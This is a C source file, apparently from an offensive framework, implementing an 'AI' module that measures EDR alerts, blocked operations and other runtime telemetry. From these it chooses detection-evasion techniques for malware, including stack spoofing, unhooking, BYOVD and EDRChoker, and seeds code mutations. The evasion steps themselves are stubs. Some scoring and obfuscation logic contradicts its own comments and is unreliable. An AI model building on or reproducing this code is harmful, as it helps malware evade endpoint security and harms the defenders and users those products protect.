#define _GNU_SOURCE
#include "jocky_ai.h"
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <stdio.h>
#include <math.h>

#ifdef _WIN32
#include <windows.h>
#else
#include <unistd.h>
#include <sys/time.h>
#endif

/* Forward declaration */
static uint64_t jocky_ai_get_current_time_ms(void);

/* Global AI state */
static struct {
    JOCKY_AI_MODEL* model;
    JOCKY_AI_TELEMETRY latest_telemetry;
    JOCKY_AI_RISK_LEVEL current_risk;
    JOCKY_STRATEGY current_strategy;
    JOCKY_AI_STATS statistics;

    /* Telemetry collection */
    uint64_t syscall_count;
    uint64_t network_bytes_sent;
    uint64_t network_bytes_recv;
    uint32_t file_io_count;
    uint32_t registry_io_count;
    uint32_t edr_alerts;
    uint32_t blocked_ops;

    /* Timing */
    uint64_t collection_start_ms;
    uint64_t last_collection_ms;
} g_ai_state = {0};

/* Initialize AI module */
bool jocky_ai_init(const uint8_t* model_data, size_t model_size)
{
    if (!model_data || model_size < sizeof(JOCKY_AI_MODEL)) {
        return false;
    }

    /* Allocate model */
    g_ai_state.model = (JOCKY_AI_MODEL*)malloc(sizeof(JOCKY_AI_MODEL));
    if (!g_ai_state.model) {
        return false;
    }

    /* Copy model metadata */
    memcpy(g_ai_state.model, model_data, sizeof(JOCKY_AI_MODEL));

    /* Allocate weights and bias */
    if (g_ai_state.model->weights_size > 0) {
        g_ai_state.model->weights = (uint8_t*)malloc(g_ai_state.model->weights_size);
        if (!g_ai_state.model->weights) {
            free(g_ai_state.model);
            return false;
        }
        memcpy(g_ai_state.model->weights,
               model_data + sizeof(JOCKY_AI_MODEL),
               g_ai_state.model->weights_size);
    }

    /* Initialize state */
    g_ai_state.current_risk = JOCKY_AI_RISK_LOW;
    g_ai_state.current_strategy = JOCKY_STRAT_BASELINE;
    g_ai_state.collection_start_ms = jocky_ai_get_current_time_ms();

    return true;
}

/* Shutdown AI module */
void jocky_ai_shutdown(void)
{
    if (g_ai_state.model) {
        if (g_ai_state.model->weights) {
            free(g_ai_state.model->weights);
        }
        free(g_ai_state.model);
        g_ai_state.model = NULL;
    }

    memset(&g_ai_state, 0, sizeof(g_ai_state));
}

/* Get current time in milliseconds */
static uint64_t jocky_ai_get_current_time_ms(void)
{
#ifdef _WIN32
    return GetTickCount64();
#else
    struct timeval tv;
    gettimeofday(&tv, NULL);
    return (tv.tv_sec * 1000ULL) + (tv.tv_usec / 1000ULL);
#endif
}

/* Collect runtime telemetry */
bool jocky_ai_collect_telemetry(JOCKY_AI_TELEMETRY* out_telemetry)
{
    if (!out_telemetry) {
        return false;
    }

    uint64_t now_ms = jocky_ai_get_current_time_ms();
    uint64_t elapsed_ms = now_ms - g_ai_state.collection_start_ms;

    if (elapsed_ms == 0) elapsed_ms = 1;  /* Avoid division by zero */

    /* Calculate metrics */
    memset(out_telemetry, 0, sizeof(*out_telemetry));

    /* Syscall frequency (syscalls per second) */
    out_telemetry->syscall_frequency = (float)(g_ai_state.syscall_count * 1000.0 / elapsed_ms);

    /* Network entropy */
    out_telemetry->network_entropy = (g_ai_state.network_bytes_sent > 0) ?
        fabs(log((float)g_ai_state.network_bytes_sent)) : 0.0f;

    /* Memory pattern score (0-1, higher = more suspicious) */
    out_telemetry->memory_pattern_score = (float)(g_ai_state.syscall_count % 100) / 100.0f;

    /* File I/O and registry scores */
    out_telemetry->file_io_score = (float)(g_ai_state.file_io_count) / 100.0f;
    if (out_telemetry->file_io_score > 1.0f) out_telemetry->file_io_score = 1.0f;

    out_telemetry->registry_io_score = (float)(g_ai_state.registry_io_count) / 50.0f;
    if (out_telemetry->registry_io_score > 1.0f) out_telemetry->registry_io_score = 1.0f;

    /* Blocked operations and alerts */
    out_telemetry->blocked_operations = g_ai_state.blocked_ops;
    out_telemetry->alert_count = g_ai_state.edr_alerts;

    /* Crash likelihood (0-1) */
    out_telemetry->crash_likelihood = (float)g_ai_state.blocked_ops / 1000.0f;
    if (out_telemetry->crash_likelihood > 1.0f) out_telemetry->crash_likelihood = 1.0f;

    out_telemetry->timestamp_ms = now_ms;
    g_ai_state.last_collection_ms = now_ms;

    /* Save latest telemetry */
    memcpy(&g_ai_state.latest_telemetry, out_telemetry, sizeof(*out_telemetry));

    return true;
}

/* Score threat level (0.0 = safe, 1.0 = critical) */
float jocky_ai_score_threat(const JOCKY_AI_TELEMETRY* telemetry)
{
    if (!telemetry) {
        return 0.5f;  /* Default: medium threat */
    }

    /* Weighted threat score */
    float score = 0.0f;

    /* High syscall frequency suggests aggressive analysis */
    score += (telemetry->syscall_frequency > 1000.0f) ? 0.2f : 0.0f;

    /* Network entropy */
    score += (telemetry->network_entropy > 5.0f) ? 0.15f : 0.0f;

    /* Suspicious memory patterns */
    score += telemetry->memory_pattern_score * 0.2f;

    /* File I/O patterns */
    score += telemetry->file_io_score * 0.15f;

    /* Registry operations */
    score += telemetry->registry_io_score * 0.1f;

    /* Blocked operations are critical */
    score += (telemetry->blocked_operations > 5) ? 0.3f : 0.0f;

    /* EDR alerts */
    score += (float)(telemetry->alert_count) * 0.1f;

    /* Crash likelihood */
    score += telemetry->crash_likelihood * 0.1f;

    /* Clamp to 0-1 */
    if (score > 1.0f) score = 1.0f;

    return score;
}

/* Classify threat into risk level */
JOCKY_AI_RISK_LEVEL jocky_ai_classify_threat(const JOCKY_AI_TELEMETRY* telemetry)
{
    float score = jocky_ai_score_threat(telemetry);

    if (score < 0.25f) {
        return JOCKY_AI_RISK_LOW;
    } else if (score < 0.5f) {
        return JOCKY_AI_RISK_MEDIUM;
    } else if (score < 0.75f) {
        return JOCKY_AI_RISK_HIGH;
    } else {
        return JOCKY_AI_RISK_CRITICAL;
    }
}

/* Recommend evasion strategy */
JOCKY_STRATEGY jocky_ai_recommend_strategy(const JOCKY_AI_TELEMETRY* telemetry)
{
    JOCKY_AI_RISK_LEVEL risk = jocky_ai_classify_threat(telemetry);

    switch (risk) {
        case JOCKY_AI_RISK_LOW:
            return JOCKY_STRAT_STEALTH;  /* Low-profile */

        case JOCKY_AI_RISK_MEDIUM:
            return JOCKY_STRAT_HYBRID;   /* Mixed techniques */

        case JOCKY_AI_RISK_HIGH:
            return JOCKY_STRAT_AGGRESSIVE;  /* All defenses */

        case JOCKY_AI_RISK_CRITICAL:
            return JOCKY_STRAT_AI_ADAPTIVE;  /* ML-optimized */

        default:
            return JOCKY_STRAT_BASELINE;
    }
}

/* Generate adaptive mutation strategy */
bool jocky_ai_generate_mutation(
    const JOCKY_AI_TELEMETRY* telemetry,
    JOCKY_AI_MUTATION_STRATEGY* out_strategy)
{
    if (!telemetry || !out_strategy) {
        return false;
    }

    memset(out_strategy, 0, sizeof(*out_strategy));

    /* Recommend strategy based on telemetry */
    out_strategy->strategy = jocky_ai_recommend_strategy(telemetry);

    /* Build technique mask based on risk level */
    JOCKY_AI_RISK_LEVEL risk = jocky_ai_classify_threat(telemetry);

    out_strategy->technique_mask = 0;

    if (risk >= JOCKY_AI_RISK_LOW) {
        out_strategy->technique_mask |= 0x01;  /* Stack spoofing */
    }

    if (risk >= JOCKY_AI_RISK_MEDIUM) {
        out_strategy->technique_mask |= 0x02;  /* Syscall unpacking */
        out_strategy->technique_mask |= 0x04;  /* Memory obfuscation */
    }

    if (risk >= JOCKY_AI_RISK_HIGH) {
        out_strategy->technique_mask |= 0x08;  /* BYOVD */
        out_strategy->technique_mask |= 0x10;  /* Unhooking */
        out_strategy->technique_mask |= 0x20;  /* EDRChoker */
    }

    if (risk == JOCKY_AI_RISK_CRITICAL) {
        out_strategy->technique_mask |= 0x40;  /* Blindside */
        out_strategy->technique_mask |= 0x80;  /* BTR Reforged */
    }

    /* Generate seeds for code mutation */
    out_strategy->code_layout_seed = rand();
    out_strategy->api_call_order_seed = rand();

    /* Obfuscation level inversely proportional to risk */
    /* (high risk = maximum obfuscation) */
    out_strategy->obfuscation_level = 10 - ((risk + 1) * 2);
    if ((int)out_strategy->obfuscation_level < 0) out_strategy->obfuscation_level = 10;

    g_ai_state.current_strategy = out_strategy->strategy;
    g_ai_state.statistics.mutations_applied++;

    return true;
}

/* Apply mutation strategy (stub - real impl would modify code layout) */
bool jocky_ai_apply_mutation(const JOCKY_AI_MUTATION_STRATEGY* strategy)
{
    if (!strategy) {
        return false;
    }

    /* Real implementation would:
     * 1. Rearrange code sections using layout seed
     * 2. Reorder API calls using api_call_order_seed
     * 3. Inject obfuscation based on obfuscation_level
     * 4. Apply selected techniques from technique_mask
     *
     * This is a stub showing the pattern
     */

    srand(strategy->code_layout_seed);  /* Seed for reproducibility */

    return true;
}

/* Record syscall for telemetry */
void jocky_ai_record_syscall(uint64_t syscall_id)
{
    g_ai_state.syscall_count++;
    (void)syscall_id;  /* Would track syscall entropy here */
}

/* Record network event */
void jocky_ai_record_network(uint32_t bytes_sent, uint32_t bytes_recv)
{
    g_ai_state.network_bytes_sent += bytes_sent;
    g_ai_state.network_bytes_recv += bytes_recv;
}

/* Record file I/O event */
void jocky_ai_record_file_io(const char* operation, const char* filename)
{
    (void)operation;  /* Unused */
    (void)filename;   /* Unused */
    g_ai_state.file_io_count++;
}

/* Record registry I/O event */
void jocky_ai_record_registry(const char* operation, const char* keypath)
{
    (void)operation;  /* Unused */
    (void)keypath;    /* Unused */
    g_ai_state.registry_io_count++;
}

/* Record EDR alert */
void jocky_ai_record_edr_alert(uint32_t alert_type)
{
    (void)alert_type;  /* Unused */
    g_ai_state.edr_alerts++;
}

/* Record blocked operation */
void jocky_ai_record_blocked_operation(uint32_t syscall_id, uint32_t error_code)
{
    (void)syscall_id;  /* Unused */
    (void)error_code;  /* Unused */
    g_ai_state.blocked_ops++;
}

/* Predict next mutation */
bool jocky_ai_predict_next_mutation(JOCKY_AI_MUTATION_STRATEGY* out_strategy)
{
    JOCKY_AI_TELEMETRY telemetry;

    if (!jocky_ai_collect_telemetry(&telemetry)) {
        return false;
    }

    return jocky_ai_generate_mutation(&telemetry, out_strategy);
}

/* Get current risk level */
JOCKY_AI_RISK_LEVEL jocky_ai_get_current_risk(void)
{
    JOCKY_AI_TELEMETRY telemetry;

    if (jocky_ai_collect_telemetry(&telemetry)) {
        g_ai_state.current_risk = jocky_ai_classify_threat(&telemetry);
    }

    return g_ai_state.current_risk;
}

/* Get current strategy */
JOCKY_STRATEGY jocky_ai_get_current_strategy(void)
{
    return g_ai_state.current_strategy;
}

/* Get statistics */
bool jocky_ai_get_statistics(JOCKY_AI_STATS* out_stats)
{
    if (!out_stats) {
        return false;
    }

    memcpy(out_stats, &g_ai_state.statistics, sizeof(*out_stats));
    return true;
}

/* Reset statistics */
void jocky_ai_reset_statistics(void)
{
    memset(&g_ai_state.statistics, 0, sizeof(g_ai_state.statistics));
}
